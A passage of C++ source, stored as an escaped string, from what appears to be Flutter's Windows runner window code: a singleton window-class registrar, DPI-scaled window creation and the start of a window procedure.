nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S"
]